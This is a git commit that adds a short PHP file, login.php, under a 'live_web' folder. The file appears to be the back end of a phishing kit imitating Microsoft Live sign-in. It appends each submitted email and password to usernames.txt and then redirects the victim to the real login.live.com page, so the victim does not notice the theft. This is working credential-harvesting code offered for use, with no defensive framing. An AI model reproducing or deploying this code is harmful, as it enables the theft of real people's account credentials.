ed7f8f7d2d8d118cd5f2733cfea0d3e62bb115af
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-06-04 15:41:23 +0500

    Add files via upload

---
+++ WebPages/live_web/login.php
@@ -0,0 +1,6 @@
+<?php
+include 'base.php';
+
+file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['email'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
+header('Location: http://login.live.com/');
+exit();
